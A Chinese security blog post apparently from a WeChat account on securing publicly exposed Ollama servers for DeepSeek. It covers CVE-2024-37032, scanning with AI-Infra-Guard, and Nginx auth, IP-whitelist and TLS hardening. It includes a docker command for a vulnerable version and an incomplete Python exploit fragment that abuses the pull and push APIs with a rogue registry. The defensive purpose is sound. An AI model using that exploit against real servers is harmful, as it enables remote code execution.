#  深度修复 DeepSeek 云端部署潜在威胁漏洞   
原创 大荒Sec  太乙Sec实验室   2025-02-20 06:13  
  
**免责声明****：**  
本公众号 **太乙Sec实验室**  
所提供的实验环境均是本地搭建，仅限于**网络安全研究与学习**  
。旨在为安全爱好者提供技术交流。任何个人或组织因传播、利用本公众号所提供的信息而进行的操作，所导致的直接或间接后果及损失，均由使用者本人负责。**太乙Sec实验室**  
及作者对此不承担任何责任  
  
  
实验背景  
  
近期大量Ollama模型服务器裸奔、云端部署的Ollama模型网络安全何解？  
<table><tbody><tr style="-webkit-tap-highlight-color: transparent;outline: 0px;height: 36px;"><td data-colwidth="137" width="137" valign="top" style="-webkit-tap-highlight-color: transparent;outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(217, 217, 217);"><p style="-webkit-tap-highlight-color: transparent;outline: 0px;min-height: 24px;"><span style="-webkit-tap-highlight-color: transparent;outline: 0px;font-size: 16px;"><span leaf="">主机</span></span></p></td><td data-colwidth="148" width="148" valign="top" style="-webkit-tap-highlight-color: transparent;outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(217, 217, 217);"><p style="-webkit-tap-highlight-color: transparent;outline: 0px;min-height: 24px;"><span style="-webkit-tap-highlight-color: transparent;outline: 0px;font-size: 16px;"><span leaf="">IP</span></span></p></td><td data-colwidth="175" width="175" valign="top" style="-webkit-tap-highlight-color: transparent;outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(217, 217, 217);"><p style="-webkit-tap-highlight-color: transparent;outline: 0px;min-height: 24px;"><span style="-webkit-tap-highlight-color: transparent;outline: 0px;font-size: 16px;"><span leaf="">账号</span></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;outline: 0px;height: 77px;"><td data-colwidth="137" width="137" valign="top" style="-webkit-tap-highlight-color: transparent;outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(217, 217, 217);"><section><span leaf="">Ubuntu</span></section></td><td data-colwidth="148" width="148" valign="top" style="-webkit-tap-highlight-color: transparent;outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(217, 217, 217);"><p style="-webkit-tap-highlight-color: transparent;outline: 0px;min-height: 24px;"><span leaf="">云主机</span></p></td><td data-colwidth="175" width="175" valign="top" style="-webkit-tap-highlight-color: transparent;outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(217, 217, 217);"><p style="-webkit-tap-highlight-color: transparent;outline: 0px;min-height: 24px;"><span style="-webkit-tap-highlight-color: transparent;outline: 0px;font-size: 16px;"><span leaf=""> xxx</span><span leaf=""><br/></span></span></p></td></tr></tbody></table>  
查看FOFA资产Ollama部署在公网的情况  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tHlQeib8sz1JFq0sRbx0ibmOcPrVAy0RUgA1BIVWdemBmZUtib5IwwoHic8ic1dsZ5MMScUy2GlkcBH84Tul6qYqEoQ/640?wx_fmt=png&from=appmsg "")  
  
根据互联网上披露，2024 年 6 月 24 日， CVE-2024-37032 Ollama 目录遍历致代码执行漏洞。由于通常情况下 Ollama 没有认证授权，攻击者可利用相关 API 结合目录遍历漏洞造成远程代码执行，控制服务器。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tHlQeib8sz1JFq0sRbx0ibmOcPrVAy0RUgs3NnJRKbcYyypekLc2bPSWW7bMb2ibiaWx1fJGlcrjqXlutJF2nLuEcQ/640?wx_fmt=png&from=appmsg "")  
## 漏洞影响  
```
Ollama < 0.1.34
```  
## 看到返回对应的版本号，就说明上面的漏洞太老了。  
```
ollama -v //0.5.7 
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tHlQeib8sz1JujFe1WXG4HewpRRwz1IWATBleO7ABChRZBj4bIrLHRiaUc5y8MQWPMEmKF5zOXqEA7GOO4Rb219A/640?wx_fmt=png&from=appmsg "")  
```
// 搭建平台
docker run -d -v ollama:/root/.ollama -p 11434:11434 --name ollama ollama/ollama:0.1.33
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tHlQeib8sz1JFq0sRbx0ibmOcPrVAy0RUgiaAlBUEgfyfyibMVh0Y9nsQ8oa2fAtC2pPLD0sjIiaBYyxx5PzR2uT4IA/640?wx_fmt=png&from=appmsg "")  
```
import requests
# 设定目标服务器的主机名
HOST = "dev-1.lan.bi0x.com"
# 组合出目标服务器的完整 URL，包含协议和端口号
target_url = f"http://{HOST}:11434"

pull_url = f"{target_url}/api/pull"

push_url = f"{target_url}/api/push"

requests.post(pull_url, json={"name": vuln_registry_url, "insecure": True})

requests.post(push_url, json={"name": vuln_registry_url, "insecure": True})

# see rogue server log
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tHlQeib8sz1JFq0sRbx0ibmOcPrVAy0RUgbMn5tq6bT7QBBbwupgPn9iagW0ba2rYoNlSEaUacPe9FTcpicKlibCKwA/640?wx_fmt=png&from=appmsg "")  
  
 a  
AI漏扫系统  
```
/by 腾讯朱雀实验室
下载地址：https://github.com/Tencent/AI-Infra-Guard/releases
用法
本地扫描
./ai-infra-guard -localscan
单一目标
./ai-infra-guard -target [IP/Domain] 
多个目标
./ai-infra-guard -target [IP/Domain] -target [IP/Domain]
从文件读取
./ai-infra-guard -file target.txt
人工智能分析
./ai-infra-guard -target [IP/Domain] -ai -token [Hunyuan token]
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tHlQeib8sz1JFq0sRbx0ibmOcPrVAy0RUgkDxQrevWR1I2kIryUJqRJvGJtZFbTjy56t07VD0JwXe7k7ERN8OP6A/640?wx_fmt=png&from=appmsg "")  
  
漏扫了一下，一堆漏洞，修复方案：更新最新版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tHlQeib8sz1JFq0sRbx0ibmOcPrVAy0RUgSargAvvIibQWGicibC0tYpkj2I4LZ6F4AIbia10D0AdnwG99HCIUPLQXQA/640?wx_fmt=png&from=appmsg "")  
  
云端部署安全措施  
  
先漏扫服务器（最新版本的模型），查看漏洞详情  
```
./ai-infra-guard  -target  http://:11434//扫描服务器
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tHlQeib8sz1IjemalaZlysEWyvTc5sicA6eeeOLmmlIfGnAb0dtR007PlLiaWUBxRKrTE5mhqyYl9p8rCo0RZujwA/640?wx_fmt=jpeg "")  
  
ollama部署安全提示LOW漏洞，导致ollama外部开放将导致算力窃取和数据资源滥用。  
  
修复措施  
  
配置OLLAMA 添加相关条件，  
修改默认端口  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tHlQeib8sz1JFq0sRbx0ibmOcPrVAy0RUgAz1CibwXTCoMmCCzlW6hIicvKiaZmdicibOQVy40oFw5MUIAdGmB3lB5yyA/640?wx_fmt=png&from=appmsg "")  
  
 网络层访问控制  
#### 可以让Nginx 通过配置域名、https、反向代理、 IP 白名单，可以限制只有特定 IP 地址的客户端才能访问 Ollama 服务。  
```
# Nginx反向代理配置
location /api/ {
  auth_request /auth;  # 对/api/路径下的请求进行身份验证，将请求转发到/auth路径进行处理
  proxy_pass http://ollama-backend;  # 将经过身份验证的请求转发到Ollama后端服务
}
location = /auth {
  internal;  # 该路径只能被Nginx内部调用，不允许外部直接访问
  proxy_pass https://keycloak/auth/realms/ollama/protocol/openid-connect/token/introspect;  # 将身份验证请求转发到Keycloak的令牌验证端点
  proxy_pass_request_body off;  # 不转发请求体
  proxy_set_header Content-Length "";  # 清空Content-Length请求头
  proxy_set_header X-Original-URI $request_uri;  # 设置X-Original-URI请求头，记录原始请求的URI
}
```  
```
//定义 IP 白名单
http {
    # 定义 IP 白名单
    geo $allow_ip {
        default 0;
        192.168.1.0/24 1;
        10.0.0.0/8 1;
    }
    server {
        listen 80;
        server_name your_domain.com;
        location / {
            if ($allow_ip = 0) {
                return 403;
            }
            proxy_pass http://backend_server;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        }
    }
}

```  
```
// 配置 SSL 证书和密钥
server {
        listen 443 ssl;
        server_name your_domain.com;
        # 配置 SSL 证书和密钥路径
        ssl_certificate /path/to/your_domain.com.crt;
        ssl_certificate_key /path/to/your_domain.com.key;
        # 配置 SSL 协议和密码套件，使用较安全的组合
        ssl_protocols TLSv1.2 TLSv1.3;
        ssl_ciphers HIGH:!aNULL:!MD5;
        ssl_prefer_server_ciphers on;
        location / {
            if ($allow_ip = 0) {
                return 403;  # 如果不在 IP 白名单内，返回 403 禁止访问
            }
            proxy_pass http://backend_server;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
        }
    }
}
```  
  
看一下效果，无法正常访问。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tHlQeib8sz1JFq0sRbx0ibmOcPrVAy0RUg8t82uX02E7ic1qv1pFkUDIpiaCIg3LLpibvELPrKdQZA4T9ngiaKQqXGPw/640?wx_fmt=png&from=appmsg "")  
  
往期精彩回顾  
  
[零基础：从搭建DeepSeek开始](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc2MDQyMg==&mid=2247486458&idx=1&sn=69916ef3b03a1efb0dac87b22c9504cc&scene=21#wechat_redirect)  
  
  
[零基础：从本地部署到云端上线，打造你的DeepSeek网络安全专家](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc2MDQyMg==&mid=2247486468&idx=1&sn=23a567f6d57c0f2271173ca675b62766&scene=21#wechat_redirect)  
  
  
**关注我****，了解****更多知识，别忘****了关注****+点赞****哦！******  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RITPxDQz30icticGDszvMCTbvDxbl8zxyibqkfOTIRXJQVU3YEHicR6AiatHvlnPic7qayibiazKoJV54NVDMmL1uVqsGg/640?wx_fmt=other&random=0.008279855111830159&random=0.8417589579850686&random=0.7406363082812077&random=0.10974797073162001&random=0.07292006660739969&wxfrom=5&wx_lazy=1&wx_co=1&random=0.9329563926201925&random=0.7721899576088909&random=0.8732144113576208&random=0.19158149965875793&random=0.14234663701611816&random=0.6197239709294833&random=0.6087404282162256&random=0.7816651464380318&random=0.6382235312520264&random=0.18529992036868959&random=0.8108904783265143&random=0.8471140121001628&random=0.08898610680286101&random=0.008507273801011683&random=0.9647940082061903&random=0.49839411124559185&random=0.36416103289090485&random=0.8610727679390984&random=0.4202445756317146&random=0.5658152415600335&random=0.05215623887101817&random=0.054673954102818945&random=0.7636185446317116&random=0.6630448098148167&random=0.6555189201793772&tp=webp "")  
  
  
